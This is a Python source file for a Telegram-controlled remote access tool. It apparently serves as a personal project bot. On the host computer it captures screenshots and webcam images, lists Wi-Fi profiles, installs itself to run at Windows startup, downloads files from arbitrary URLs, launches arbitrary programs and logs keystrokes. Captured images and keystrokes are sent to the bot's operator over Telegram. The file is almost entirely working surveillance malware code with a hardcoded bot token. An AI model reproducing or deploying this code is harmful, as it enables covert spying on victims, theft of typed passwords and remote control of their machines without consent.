#Telegram Bot - @arunsanjeevms

import os
import subprocess
import pyautogui
import pyperclip
import webbrowser
import requests
import platform
import cv2  # For camera snapshot
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler
from pynput import keyboard  # For keylogging
import threading

BOT_TOKEN = "7606188815:AAF7oQuyLgVsZ5SBnx5ChbE9yRs6dYRpC57" #Bot Token from botfather
keylogger_data = []  # To store keylog data
keylogger_active = False

# Function to take a screenshot
async def screenshot(update: Update, context) -> None:
    screenshot = pyautogui.screenshot()
    screenshot_path = "screenshot.png"
    screenshot.save(screenshot_path)
    await context.bot.send_photo(chat_id=update.effective_chat.id, photo=open(screenshot_path, 'rb'))
    os.remove(screenshot_path)

# Function to take a camera snapshot
async def take_snapshot(update: Update, context) -> None:
    camera = cv2.VideoCapture(0)
    ret, frame = camera.read()
    if ret:
        snapshot_path = "snapshot.png"
        cv2.imwrite(snapshot_path, frame)
        await context.bot.send_photo(chat_id=update.effective_chat.id, photo=open(snapshot_path, 'rb'))
        os.remove(snapshot_path)
    camera.release()

# Function to show Wi-Fi passwords
async def show_wifi_passwords(update: Update, context) -> None:
    if platform.system() == "Windows":
        command = "netsh wlan show profiles"
        profiles = subprocess.check_output(command, shell=True, text=True)
        await update.message.reply_text(profiles)
    else:
        await update.message.reply_text("This function is not supported on your OS.")

# Function to add the bot to startup
async def add_to_startup(update: Update, context) -> None:
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
    bot_file = os.path.join(startup_folder, "YourBotName.lnk")
    subprocess.call(['powershell', '-command', f"$s=(New-Object -COM WScript.Shell).CreateShortcut('{bot_file}'); $s.TargetPath='C:\\Path\\To\\YourBotScript.py'; $s.Save()"])
    await update.message.reply_text("Bot added to startup.")

# Function to show an alert box
async def show_alert(update: Update, context) -> None:
    import ctypes
    ctypes.windll.user32.MessageBoxW(0, "This is an alert!", "Alert", 1)
    await update.message.reply_text("Alert shown!")

# Function to open a website
async def open_website(update: Update, context) -> None:
    url = context.args[0] if context.args else "https://www.example.com"
    webbrowser.open(url)
    await update.message.reply_text(f"Opened website: {url}")

# Function to download a file
async def download_file(update: Update, context) -> None:
    url = context.args[0] if context.args else None
    if url:
        response = requests.get(url)
        with open("downloaded_file", "wb") as f:
            f.write(response.content)
        await update.message.reply_text("File downloaded successfully.")
    else:
        await update.message.reply_text("Please provide a URL to download.")

# Function to start an application
async def start_application(update: Update, context) -> None:
    app_path = context.args[0] if context.args else None
    if app_path:
        subprocess.Popen(app_path)
        await update.message.reply_text(f"Started application: {app_path}")
    else:
        await update.message.reply_text("Please provide the application path.")

# Function to copy text to clipboard
async def copy_to_clipboard(update: Update, context) -> None:
    text = " ".join(context.args)
    pyperclip.copy(text)
    await update.message.reply_text("Text copied to clipboard.")

# Function to start a keylogger
def start_keylogger():
    global keylogger_active
    keylogger_active = True

    def on_press(key):
        if key == keyboard.Key.esc:
            return False
        try:
            keylogger_data.append(key.char)
        except AttributeError:
            keylogger_data.append(str(key))

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

async def start_keylogger_command(update: Update, context) -> None:
    threading.Thread(target=start_keylogger).start()
    await update.message.reply_text("Keylogger started.")

# Function to stop the keylogger
async def stop_keylogger(update: Update, context) -> None:
    global keylogger_active
    keylogger_active = False
    await update.message.reply_text("Keylogger stopped.")

# Function to dump keylogger data
async def dump_keylogger(update: Update, context) -> None:
    global keylogger_data
    if keylogger_data:
        await update.message.reply_text("Keylogger data:\n" + "\n".join(keylogger_data))
    else:
        await update.message.reply_text("No keylogger data found.")

# Show the main menu on /start command
async def start(update: Update, context) -> None:
    welcome_message = (
        "Welcome to Arun's Bot! Here are your options Below\n\n"
    )

    # Create inline keyboard with links to profiles
    keyboard = [
        [InlineKeyboardButton("Screenshot", callback_data='screenshot'),
         InlineKeyboardButton("Camera Snapshot", callback_data='snapshot')],
        [InlineKeyboardButton("Show Wi-Fi Passwords", callback_data='wifi'),
         InlineKeyboardButton("Add to Startup", callback_data='startup')],
        [InlineKeyboardButton("Show Alert", callback_data='alert'),
         InlineKeyboardButton("Open Website", callback_data='open')],
        [InlineKeyboardButton("Download File", callback_data='download'),
         InlineKeyboardButton("Start Application", callback_data='startapp')],
        [InlineKeyboardButton("Copy to Clipboard", callback_data='copy'),
         InlineKeyboardButton("Start Keylogger", callback_data='startkeylogger')],
        [InlineKeyboardButton("Stop Keylogger", callback_data='stopkeylogger'),
         InlineKeyboardButton("Dump Keylogger Data", callback_data='dumpkeylogger')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    # Send the welcome message with inline keyboard
    await update.message.reply_text(welcome_message, reply_markup=reply_markup)

# Main function to initialize the bot
def main() -> None:
    app = Application.builder().token(BOT_TOKEN).build()

    # Command handlers
    app.add_handler(CommandHandler("start", start))  # /start
    app.add_handler(CommandHandler("screenshot", screenshot))  # /screenshot
    app.add_handler(CommandHandler("snapshot", take_snapshot))  # /snapshot
    app.add_handler(CommandHandler("wifi", show_wifi_passwords))  # /wifi
    app.add_handler(CommandHandler("startup", add_to_startup))  # /startup
    app.add_handler(CommandHandler("alert", show_alert))  # /alert
    app.add_handler(CommandHandler("open", open_website))  # /open <url>
    app.add_handler(CommandHandler("download", download_file))  # /download <url>
    app.add_handler(CommandHandler("startapp", start_application))  # /startapp <path>
    app.add_handler(CommandHandler("copy", copy_to_clipboard))  # /copy <text>
    app.add_handler(CommandHandler("startkeylogger", start_keylogger_command))  # /startkeylogger
    app.add_handler(CommandHandler("stopkeylogger", stop_keylogger))  # /stopkeylogger
    app.add_handler(CommandHandler("dumpkeylogger", dump_keylogger))  # /dumpkeylogger

    # Start the bot
    app.run_polling()

if __name__ == "__main__":
    main()
